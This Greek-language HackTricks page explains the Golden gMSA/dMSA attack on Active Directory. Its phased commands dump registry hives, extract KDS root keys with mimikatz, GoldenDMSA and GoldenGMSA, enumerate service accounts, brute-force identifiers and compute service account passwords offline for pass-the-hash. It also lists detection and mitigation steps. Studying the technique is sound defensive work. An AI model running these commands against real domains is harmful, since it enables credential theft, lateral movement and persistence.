# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Windows Managed Service Accounts (MSA) είναι ειδικοί principals σχεδιασμένοι για την εκτέλεση services χωρίς να απαιτείται χειροκίνητη διαχείριση των passwords τους.
Υπάρχουν δύο κύριες παραλλαγές:

1. **gMSA** – group Managed Service Account – μπορεί να χρησιμοποιηθεί σε πολλαπλά hosts που είναι εξουσιοδοτημένα στο attribute `msDS-GroupMSAMembership`.
2. **dMSA** – delegated Managed Service Account – ο (preview) διάδοχος του gMSA, ο οποίος βασίζεται στην ίδια κρυπτογραφία, αλλά επιτρέπει πιο granular σενάρια delegation.

Και στις δύο παραλλαγές, το **password δεν αποθηκεύεται** σε κάθε Domain Controller (DC) όπως ένα συνηθισμένο NT-hash. Αντίθετα, κάθε DC μπορεί να κάνει **derive** το τρέχον password on-the-fly από:

* Το forest-wide **KDS Root Key** (`KRBTGT\KDS`) – ένα randomly generated GUID-named secret, replicated σε κάθε DC κάτω από το container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Το **SID** του target account.
* Ένα per-account **ManagedPasswordID** (GUID), το οποίο βρίσκεται στο attribute `msDS-ManagedPasswordId`.

Η derivation είναι: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob μεγέθους 240 bytes, το οποίο τελικά γίνεται **base64-encoded** και αποθηκεύεται στο attribute `msDS-ManagedPassword`.
Κατά τη φυσιολογική χρήση του password δεν απαιτείται Kerberos traffic ή domain interaction – ένα member host κάνει derive το password locally, εφόσον γνωρίζει τα τρία inputs.

## Golden gMSA / Golden dMSA Attack

Αν ένας attacker μπορέσει να αποκτήσει και τα τρία inputs **offline**, μπορεί να υπολογίσει **έγκυρα τρέχοντα και μελλοντικά passwords** για οποιοδήποτε gMSA/dMSA στο forest, χωρίς να αγγίξει ξανά το DC, παρακάμπτοντας:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals (μπορεί να κάνει pre-compute)

Αυτό είναι ανάλογο με ένα *Golden Ticket* για service accounts.<sup>[[1]](#references)[[2]](#references)</sup>

### Προαπαιτούμενα

1. **Forest-level compromise** ενός **DC** (ή Enterprise Admin), ή πρόσβαση `SYSTEM` σε ένα από τα DCs του forest.
2. Δυνατότητα enumeration των service accounts (LDAP read / RID brute-force).
3. Workstation με .NET ≥ 4.7.2 x64 για την εκτέλεση του [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ή equivalent code.<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – Extract το KDS Root Key

Κάνε Dump από οποιοδήποτε DC (Volume Shadow Copy / raw SAM+SECURITY hives ή remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
Η συμβολοσειρά base64 με την ετικέτα `RootKey` (όνομα GUID) απαιτείται στα επόμενα βήματα.<sup>[[1]](#references)[[2]](#references)</sup>

##### Φάση 2 – Enumerate αντικείμενα gMSA / dMSA

Ανακτήστε τουλάχιστον τα `sAMAccountName`, `objectSid` και `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) υλοποιεί βοηθητικές λειτουργίες:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Φάση 3 – Guess / Discover το ManagedPasswordID (όταν λείπει)

Ορισμένα deployments *strip* το `msDS-ManagedPasswordId` από ACL-protected reads.
Επειδή το GUID είναι 128-bit, το naive bruteforce είναι ανέφικτο, αλλά:

1. Τα πρώτα **32 bits = Unix epoch time** της δημιουργίας του account (ανάλυση σε λεπτά).
2. Ακολουθούν 96 random bits.

Επομένως, ένα **narrow wordlist ανά account** (± λίγες ώρες) είναι ρεαλιστικό.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Το εργαλείο υπολογίζει υποψήφιους κωδικούς πρόσβασης και συγκρίνει το base64 blob τους με το πραγματικό attribute `msDS-ManagedPassword` – η αντιστοίχιση αποκαλύπτει το σωστό GUID.

##### Φάση 4 – Offline υπολογισμός και μετατροπή κωδικού πρόσβασης

Μόλις γίνει γνωστό το ManagedPasswordID, ο έγκυρος κωδικός πρόσβασης απέχει μόλις μία εντολή:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Τα resulting hashes μπορούν να εισαχθούν με **mimikatz** (`sekurlsa::pth`) ή **Rubeus** για Kerberos abuse, επιτρέποντας stealth **lateral movement** και **persistence**.

## Εντοπισμός & Μετριασμός

* Περιορίστε τις δυνατότητες **DC backup και registry hive read** σε Tier-0 administrators.
* Παρακολουθείτε τη δημιουργία **Directory Services Restore Mode (DSRM)** ή **Volume Shadow Copy** σε DCs.
* Ελέγχετε τις αναγνώσεις / αλλαγές στο `CN=Master Root Keys,…` και στα flags `userAccountControl` των service accounts.
* Εντοπίζετε ασυνήθιστες εγγραφές password σε **base64** ή ξαφνική επαναχρησιμοποίηση service password σε hosts.
* Εξετάστε τη μετατροπή των gMSAs με υψηλά προνόμια σε **classic service accounts**, με τακτικές τυχαίες rotations, όπου δεν είναι δυνατή η απομόνωση Tier-0.

## Εργαλεία

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – reference implementation που χρησιμοποιείται σε αυτή τη σελίδα.<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – reference implementation που χρησιμοποιείται σε αυτή τη σελίδα.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket με χρήση derived AES keys.

## Αναφορές

- [1] [Golden dMSA – authentication bypass για delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
